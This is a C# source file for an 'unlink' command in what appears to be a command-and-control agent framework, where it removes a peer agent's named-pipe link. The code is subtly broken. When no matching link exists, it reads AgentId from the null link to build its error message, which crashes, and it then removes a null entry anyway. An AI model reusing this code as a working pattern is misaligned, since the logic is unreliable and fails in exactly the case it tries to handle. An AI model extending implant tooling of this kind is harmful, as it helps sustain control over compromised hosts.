using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class UnLinkCommand : AgentCommand
    {
        public override string Name => "unlink";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {
            if (task.SplittedArgs.Count() != 1)
            {
                return;
            }

            var link = agent.PipeCommunicator.Links.FirstOrDefault(l => l.AgentId == task.SplittedArgs[0]);
            if (link == null)
                result.Result += "Unable to find link for " + link.AgentId;
            agent.PipeCommunicator.Links.Remove(link);
        }
    }
}
